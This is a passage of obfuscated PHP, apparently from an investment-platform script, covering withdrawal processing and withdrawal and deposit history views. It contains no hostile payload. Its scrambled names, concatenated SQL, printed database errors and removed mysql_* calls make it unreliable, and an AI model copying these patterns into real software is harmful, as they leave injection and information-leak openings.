                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcewesn ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 25)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcknugv ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlcqbku == 1)
                                  {
                                    $q = '' . 'delete from hm2_history where id = ' . $elnlcMTeWS;
                                    mysql_query ($q);
                                    $q = 'insert into hm2_history set
  		user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
  		amount = -' . $elnlcrUqv . ',
  		actual_amount = -' . $elnlcrUqv . ',
  		type=\'withdrawal\',
  		date = now(),
  		ec = ' . $elnlciSebT . ',
  		description = \'Withdraw to account ') . $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT] . ('' . '. Batch is ' . $elnlcVTlA . '\'');
                                    (mysql_query ($q) OR print mysql_error ());
                                    $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
                                    $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT];
                                    $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
                                    elnlcsius ('withdraw_user_notification', $elnlcgcnET['email'], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                    elnlcsius ('withdraw_admin_notification', $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                    header ('' . 'Location: ?a=withdraw&say=processed&batch=' . $elnlcVTlA);
                                    elnlcnooln ($elnlcUazB);
                                    exit ();
                                  }
                                }
                              }
                            }
                          }

                          header ('Location: ?a=withdraw&say=processed');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                        else
                        {
                          if ($elnlcrUqv <= $elnlcotDB[total] + $elnlcEEGK)
                          {
                            header ('Location: ?a=withdraw&say=on_hold');
                          }
                          else
                          {
                            header ('Location: ?a=withdraw&say=not_enought');
                          }

                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                      }
                      else
                      {
                        $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        $elnlcotDB = elnlcmext ($elnlckapu);
                        $elnlcTshQ = array ();
                        $elnlcotDB[$elnlcsyENS['elnlcbzLT']] = 0 - $elnlcotDB[$elnlcsyENS['elnlcbzLT']];
                        reset ($elnlcotDB);
                        while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcotDB))
                        {
                          if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                          {
                            $elnlcOBJb = floor ($elnlcOBJb * 1000000) / 1000000;
                          }
                          else
                          {
                            $elnlcOBJb = floor ($elnlcOBJb * 100) / 100;
                          }

                          $elnlcTshQ[$elnlcuwppG] = number_format ($elnlcOBJb, 2);
                        }

                        $elnlcfhFg->assign ('say', $elnlcWodOE[$elnlcsyENS['elnlciKgs']]);
                        $elnlcfhFg->assign ('batch', $elnlcWodOE[$elnlcsyENS['elnlcwuPu']]);
                        $elnlclOiWI = ($elnlcSuVc[$elnlcsyENS['elnlcuNmr']] ? 5 : 2);
                        $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcwtCL = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          if ($elnlclOiWI == 2)
                          {
                            if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                            {
                              $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 1000000) / 1000000;
                            }
                            else
                            {
                              $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 100) / 100;
                            }
                          }

                          $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']], $elnlclOiWI);
                          if (100 < $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']])
                          {
                            $elnlcfhFg->assign ('other_processings', 1);
                          }

                          $elnlcwtCL += $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']];
                        }

                        $elnlcTshQ[$elnlcsyENS['elnlceleT']] = number_format ($elnlcwtCL, $elnlclOiWI);
                        $elnlcfhFg->assign ('ab_formated', $elnlcTshQ);
                        $elnlcQTTo = array ();
                        reset ($elnlcGPfS);
                        foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                        {
                          array_push ($elnlcQTTo, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcjpFA[$elnlckapu]), (array)$elnlcoFEhc));
                        }

                        $elnlcTmCT = array ();
                        if ($elnlcSuVc[$elnlcsyENS['elnlcHrRLP']] == 1)
                        {
                          $q = '' . 'select id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and status=\'on\'';
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            array_push ($elnlcadsc, $elnlcCgqPK[id]);
                          }

                          $q = 'select sum(actual_amount) as amount, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and 
	deposit_id in (' . join (',', $elnlcadsc) . ') and 
			(type=\'earning\' or 
	(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\'))) group by ec';
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            array_push ($elnlcTmCT, array ('ec' => $elnlcCgqPK[ec], 'amount' => number_format ($elnlcCgqPK[amount], 2)));
                          }
                        }
                        else
                        {
                          if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                          {
                            $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[id] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
	      hm2_deposits.deposit_date + interval hm2_types.hold day > now() and
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
	    group by hm2_history.ec
          ';
                          }
                          else
                          {
                            $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[id] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
	    group by hm2_history.ec
          ';
                          }

                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            array_push ($elnlcTmCT, array ('ec' => $elnlcCgqPK[ec], 'amount' => number_format ($elnlcCgqPK[am], 2)));
                          }
                        }

                        $elnlcfhFg->assign ('hold', $elnlcTmCT);
                        $elnlcjpFA = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcEoNu']]);
                        $elnlcacqs = array ();
                        $elnlcUunHC = array ();
                        foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                        {
                          if (($elnlcoFEhc[status] == 1 AND $elnlcoFEhc[has_account] == 1))
                          {
                            array_push ($elnlcacqs, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcjpFA[$elnlckapu]), (array)$elnlcoFEhc));
                            if (0 < $elnlcGPfS[$elnlckapu][$elnlcsyENS['elnlcTcMv']])
                            {
                              array_push ($elnlcUunHC, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcjpFA[$elnlckapu]), (array)$elnlcoFEhc));
                            }
                          }

                          if (($elnlcoFEhc[status] == 1 AND $elnlcoFEhc[has_account] != 1))
                          {
                            $elnlcfhFg->assign ('other_processings', 1);
                            if (0 < $elnlcGPfS[$elnlckapu][$elnlcsyENS['elnlcTcMv']])
                            {
                              array_push ($elnlcUunHC, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcjpFA[$elnlckapu]), (array)$elnlcoFEhc));
                              continue;
                            }

                            continue;
                          }
                        }

                        $elnlcfhFg->assign ('pay_accounts', $elnlcacqs);
                        $elnlcfhFg->assign ('withdraw_systems', $elnlcUunHC);
                        $elnlcfhFg->assign ('ps', $elnlcQTTo);
                        $elnlcfhFg->display ($elnlcsyENS['elnlcVIBb']);
                      }
                    }

                    print base64_decode ('Cg==
');
                  }
                  else
                  {
                    if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcyJmCK'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                    {
                      $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                      $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcHSUz']]);
                      $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcmEWD']]);
                      $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcMeCs']]);
                      $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']]);
                      $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcgjPm']]);
                      $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcQwVC']]);
                      if ($elnlcWodOE[$elnlcsyENS['elnlcHSUz']] == 0)
                      {
                        $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = date ('j', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                        $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = date ('n', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                        $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                        $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = $elnlcsyENS['elnlctNxTK'];
                        $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = $elnlcWodOE[$elnlcsyENS['elnlcmEWD']];
                        $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = $elnlcWodOE[$elnlcsyENS['elnlcMeCs']];
                      }

                      $elnlckeTje = '\'' . $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] . '\' + interval 0 day < date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour and ' . '\'' . $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] . '\' + interval 1 day > date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour ';
                      $elnlcuBUM = ' and type in (\'withdrawal\', \'withdraw_pending\')';
                      $elnlckCfG = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? 'asc' : 'desc');
                      $elnlcGwoqs = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? '%b-%e-%Y<br>%r' : '%b-%e-%Y %r');
                      $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'' . $elnlcGwoqs . '\') as d from hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' and user_id = ' . $elnlckapu . ' order by date ' . $elnlckCfG . ', id ' . $elnlckCfG);
                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                      $elnlcgDhFp = array ();
                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                      {
                        $elnlcCgqPK[$elnlcsyENS['elnlcCooj']] = $elnlcvHtR[$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]];
                        $elnlcCgqPK[$elnlcsyENS['elnlcBwTp']] = ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < 0 ? 1 : 0);
                        $elnlcCgqPK[$elnlcsyENS['elnlcvQExl']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
                        $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] = number_format (0 - $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']], 2);
                        array_push ($elnlcgDhFp, $elnlcCgqPK);
                      }

                      if ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']])
                      {
                        $elnlcairsl = $elnlcsyENS['elnlcmjUx'];
                        $elnlcnDGD = $elnlcsyENS['elnlcmjUx'];
                        for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($elnlcgDhFp); ++$i)
                        {
                          $elnlcVhxW = $elnlcgDhFp[$i][$elnlcsyENS['elnlcLbvLL']];
                          $q = '' . 'select sum(actual_amount) as balance from hm2_history where id < ' . $elnlcVhxW . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                          $elnlcgDhFp[$i][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcewnve + $elnlcgDhFp[$i][$elnlcsyENS['elnlcvQExl']], 2);
                        }

                        $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                        $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                        $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                        $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                        $elnlcfhFg->assign ('perioddebit', number_format (abs ($elnlcairsl), 2));
                        $elnlcfhFg->assign ('periodcredit', number_format (abs ($elnlcnDGD), 2));
                        $elnlcfhFg->assign ('periodbalance', number_format ($elnlcqMqEH, 2));
                        $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where 1=1 ' . $elnlcuBUM . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                        $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                        $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                        $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                        $elnlcfhFg->assign ('alldebit', number_format (abs ($elnlcairsl), 2));
                        $elnlcfhFg->assign ('allcredit', number_format (abs ($elnlcnDGD), 2));
                        $elnlcfhFg->assign ('allbalance', number_format ($elnlcqMqEH, 2));
                      }

                      $q = '' . 'select sum(actual_amount) as periodsum from hm2_history where ' . $elnlckeTje . ' and user_id = ' . $elnlckapu . ' and type in (\'withdrawal\', \'withdraw_pending\')';
                      $elnlchGkPU = mysql_query ($q);
                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                      $elnlcUaCVg = $elnlcCgqPK[$elnlcsyENS['elnlcEaup']];
                      $elnlcfhFg->assign ('periodsum', number_format (0 - $elnlcUaCVg, 2));
                      $q = '' . 'select sum(actual_amount) as sum from hm2_history where 1=1 ' . $elnlcCnIy . ' and user_id = ' . $elnlckapu . ' and type in (\'withdrawal\', \'withdraw_pending\')';
                      $elnlchGkPU = mysql_query ($q);
                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                      $elnlcWNITs = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
                      $elnlcfhFg->assign ('allsum', number_format (0 - $elnlcWNITs, 2));
                      $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
                      $elnlcfhFg->assign ('month', $elnlcdRCR);
                      $elnlcRaue = array ();
                      for ($i = $elnlcsyENS['elnlctNxTK']; $i <= 31; ++$i)
                      {
                        array_push ($elnlcRaue, $i);
                      }

                      $elnlcfhFg->assign ('day', $elnlcRaue);
                      $elnlczLFnQ = array ();
                      for ($i = $elnlcSuVc[$elnlcsyENS['elnlcArER']]; $i <= date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60); ++$i)
                      {
                        array_push ($elnlczLFnQ, $i);
                      }

                      $elnlcfhFg->assign ('year', $elnlczLFnQ);
                      $elnlcfhFg->assign ('trans', $elnlcgDhFp);
                      $elnlcfhFg->assign ('qtrans', sizeof ($elnlcgDhFp));
                      $elnlcfhFg->assign ('frm', $elnlcWodOE);
                      $elnlcfhFg->display ($elnlcsyENS['elnlcwjJNu']);
                      print base64_decode ('Cg==
');
                    }
                    else
                    {
                      if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcJGtJ'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                      {
                        $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcHSUz']]);
                        $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcmEWD']]);
                        $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcMeCs']]);
                        $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']]);
                        $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcgjPm']]);
                        $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcQwVC']]);
                        if ($elnlcWodOE[$elnlcsyENS['elnlcHSUz']] == 0)
                        {
                          $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = date ('j', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                          $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = date ('n', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                          $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                          $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = $elnlcsyENS['elnlctNxTK'];
                          $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = $elnlcWodOE[$elnlcsyENS['elnlcmEWD']];
                          $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = $elnlcWodOE[$elnlcsyENS['elnlcMeCs']];
                        }

                        $elnlckeTje = '\'' . $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] . '\' + interval 0 day < date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour and ' . '\'' . $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] . '\' + interval 1 day > date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour ';
                        $elnlcuBUM = ' and type in (\'deposit\', \'early_deposit_release\', \'release_deposit\', \'early_deposit_charge\')';
                        $elnlckCfG = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? 'asc' : 'desc');
                        $elnlcGwoqs = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? '%b-%e-%Y<br>%r' : '%b-%e-%Y %r');
                        $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'' . $elnlcGwoqs . '\') as d from hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' and user_id = ' . $elnlckapu . ' order by date ' . $elnlckCfG . ', id ' . $elnlckCfG);
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcgDhFp = array ();
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcCgqPK[$elnlcsyENS['elnlcCooj']] = $elnlcvHtR[$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]];
                          $elnlcCgqPK[$elnlcsyENS['elnlcBwTp']] = ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < 0 ? 1 : 0);
                          $elnlcCgqPK[$elnlcsyENS['elnlcvQExl']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
                          $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]), 2);
                          array_push ($elnlcgDhFp, $elnlcCgqPK);
                        }

                        if ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']])
                        {
                          $elnlcairsl = $elnlcsyENS['elnlcmjUx'];
                          $elnlcnDGD = $elnlcsyENS['elnlcmjUx'];
                          for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($elnlcgDhFp); ++$i)
                          {
                            $elnlcVhxW = $elnlcgDhFp[$i][$elnlcsyENS['elnlcLbvLL']];
                            $q = '' . 'select sum(actual_amount) as balance from hm2_history where id < ' . $elnlcVhxW . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                            $elnlchGkPU = mysql_query ($q);
                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                            $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                            $elnlcgDhFp[$i][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcewnve + $elnlcgDhFp[$i][$elnlcsyENS['elnlcvQExl']], 2);
                          }

                          $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                          $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                          $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                          $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                          $elnlcfhFg->assign ('perioddebit', number_format (abs ($elnlcairsl), 2));
                          $elnlcfhFg->assign ('periodcredit', number_format (abs ($elnlcnDGD), 2));
                          $elnlcfhFg->assign ('periodbalance', number_format ($elnlcqMqEH, 2));
                          $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where 1=1 ' . $elnlcuBUM . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                          $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                          $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                          $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                          $elnlcfhFg->assign ('alldebit', number_format (abs ($elnlcairsl), 2));
                          $elnlcfhFg->assign ('allcredit', number_format (abs ($elnlcnDGD), 2));
                          $elnlcfhFg->assign ('allbalance', number_format ($elnlcqMqEH, 2));
                        }

                        $q = '' . 'select sum(actual_amount) as periodsum from hm2_history where ' . $elnlckeTje . ' and user_id = ' . $elnlckapu . ' and type in (\'deposit\', \'early_deposit_release\', \'release_deposit\', \'early_deposit_charge\')';
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        $elnlcUaCVg = $elnlcCgqPK[$elnlcsyENS['elnlcEaup']];
                        $elnlcfhFg->assign ('periodsum', number_format (0 - $elnlcUaCVg, 2));
                        $q = '' . 'select sum(actual_amount) as sum from hm2_history where 1=1 ' . $elnlcCnIy . ' and user_id = ' . $elnlckapu . ' and type in (\'deposit\', \'early_deposit_release\', \'release_deposit\', \'early_deposit_charge\')';
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        $elnlcWNITs = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
                        $elnlcfhFg->assign ('allsum', number_format (0 - $elnlcWNITs, 2));
                        $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
                        $elnlcfhFg->assign ('month', $elnlcdRCR);
                        $elnlcRaue = array ();
                        for ($i = $elnlcsyENS['elnlctNxTK']; $i <= 31; ++$i)
                        {
                          array_push ($elnlcRaue, $i);
                        }

                        $elnlcfhFg->assign ('day', $elnlcRaue);
                        $elnlczLFnQ = array ();
                        for ($i = $elnlcSuVc[$elnlcsyENS['elnlcArER']]; $i <= date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60); ++$i)
                        {
                          array_push ($elnlczLFnQ, $i);
                        }

                        $elnlcfhFg->assign ('year', $elnlczLFnQ);
                        $elnlcfhFg->assign ('trans', $elnlcgDhFp);
                        $elnlcfhFg->assign ('qtrans', sizeof ($elnlcgDhFp));
                        $elnlcfhFg->assign ('frm', $elnlcWodOE);
                        $elnlcfhFg->display ($elnlcsyENS['elnlcwxAlz']);
                        print base64_decode ('Cg==
');
                      }
                      else
                      {
                        if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcJlNJ'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                        {
                          $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          $elnlcgNwD = $elnlcWodOE[$elnlcsyENS['elnlcsMIe']];
                          $elnlccJqA = $elnlcsyENS['elnlcmjUx'];
                          $elnlcJNpjH = array ();
                          $q = '' . 'select type from hm2_history where user_id = ' . $elnlckapu . ' group by type order by type';
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            if ($elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] == $elnlcsyENS['elnlcmKlEe'])
                            {
                              $elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] = $elnlcsyENS['elnlcKIwG'];
                            }

